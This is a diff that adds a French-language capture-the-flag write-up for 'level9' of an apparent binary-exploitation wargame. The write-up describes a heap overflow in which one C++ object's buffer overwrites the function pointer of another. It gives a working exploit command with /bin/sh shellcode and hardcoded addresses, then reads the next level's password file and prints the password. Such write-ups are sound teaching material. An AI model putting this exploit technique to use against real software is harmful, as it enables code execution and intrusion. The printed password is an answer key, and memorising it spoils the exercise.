@@ -1,0 +1,26 @@
+level9 : 
+
+Le programme fait une création de deux instances N (N1 et N2)
+./level9 $(python -c "print 'A'*109") → segfault de setAnnotation 108 bytes 
+Chaque instance N fait 108 bytes.
+
+a la fin du code un appel de pointeur sur fonction à l'adresse de N2
+
+setAnnotation de N1 est appelé : il set du contenu sur le buffer annotation de la première instance. le buffer annotation de N1 sur la heap peut overwrite sur N2 (car sur la heap il écrase vers le haut).
+Donc dans N2 on va y placer l'adresse de l'adresse du shellcode : 
+(**(code **)*this_00)(this_00,this); car cette ligne appelle l’adresse du pointeur sur fonction
+. On place le shellcode dans le buffer N1 après sa propre adresse : celle du memcpy + 4.
+
+
+ltrace ./level9 AAAA
+memcpy(0x0804a00c, "AAAA", 4)                     = 0x0804a00c
+
+l'adresse du shellcode est la ou on a memcpy + 4 (car c’est la ou on le place et on met sa propre adresse au debut): 0x0804a010
+
+Le memcpy met le contenu dans son buffer membre à l'adress suivante \x10\xa0\x04\x08
+tentative d’injection du shellcode
+./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A' * 79 + '\x0c\xa0\x04\x08'")
+
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
